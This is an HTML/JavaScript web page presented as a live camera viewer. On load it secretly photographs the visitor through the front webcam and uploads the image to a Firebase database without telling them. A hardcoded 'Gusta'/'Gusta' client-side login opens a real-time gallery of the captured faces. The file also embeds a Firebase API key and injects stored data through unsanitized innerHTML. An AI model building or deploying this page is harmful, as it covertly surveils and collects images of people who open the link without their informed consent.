<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Câmera ao Vivo - Realtime</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; }
        #admin-area { position: absolute; top: 10px; left: 10px; z-index: 100; }
        .login-box { background: rgba(0, 0, 0, 0.85); padding: 12px; border-radius: 8px; display: flex; flex-direction: column; gap: 8px; border: 1px solid #444; }
        input { padding: 6px; border-radius: 4px; border: none; width: 130px; background: #222; color: #fff; }
        button { cursor: pointer; background: #007bff; color: white; border: none; padding: 8px; border-radius: 4px; font-size: 12px; }
        video { width: 100vw; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; }
        canvas { display: none; }
        .hidden { display: none !important; }
        #historico-painel { background: rgba(10, 10, 10, 0.9); padding: 10px; border-radius: 8px; margin-top: 10px; width: 280px; max-height: 500px; overflow-y: auto; border: 1px solid #555; }
        .log-item { margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #333; list-style: none; }
        .log-item img { width: 100%; border-radius: 6px; margin-top: 8px; border: 1px solid #666; }
        .log-date { font-size: 11px; color: #007bff; font-weight: bold; }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas-foto"></canvas>

    <div id="admin-area">
        <div id="form-login" class="login-box">
            <input type="text" id="usuario" placeholder="User">
            <input type="password" id="senha" placeholder="Pass">
            <button onclick="verificarAdmin()">Ver Histórico Realtime</button>
        </div>

        <div id="painel-admin" class="hidden">
            <div class="login-box">
                <div style="display:flex; justify-content: space-between; align-items:center;">
                    <span>Painel: Gusta</span>
                    <button onclick="location.reload()" style="background:#d9534f;">Fechar</button>
                </div>
                <div id="historico-painel">
                    <h4 style="margin:0 0 10px 0;">Capturas em Tempo Real:</h4>
                    <div id="lista-historico">Aguardando novos acessos...</div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
            projectId: "cameralog-24090",
            appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas-foto');

        async function iniciarApp() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                setTimeout(capturarEEnviar, 3000);
            } catch (err) { console.error("Erro:", err); }
        }

        function capturarEEnviar() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.4);
            
            db.collection("acessos").add({
                data: new Date().toLocaleString('pt-BR'),
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                imagem: fotoBase64
            });
        }

        function verificarAdmin() {
            if (document.getElementById('usuario').value === "Gusta" && document.getElementById('senha').value === "Gusta") {
                document.getElementById('form-login').classList.add('hidden');
                document.getElementById('painel-admin').classList.remove('hidden');
                carregarHistoricoRealtime();
            } else { alert("Acesso negado."); }
        }

        // Esta função escuta o banco de dados e atualiza a lista na hora
        function carregarHistoricoRealtime() {
            const lista = document.getElementById('lista-historico');
            
            db.collection("acessos").orderBy("timestamp", "desc").onSnapshot((snapshot) => {
                lista.innerHTML = ""; // Limpa para renderizar a lista atualizada em tempo real
                snapshot.forEach((doc) => {
                    const dados = doc.data();
                    const div = document.createElement('div');
                    div.className = "log-item";
                    div.innerHTML = `
                        <div class="log-date">${dados.data}</div>
                        <img src="${dados.imagem}">
                    `;
                    lista.appendChild(div);
                });
            });
        }

        window.onload = iniciarApp;
    </script>
</body>
</html>
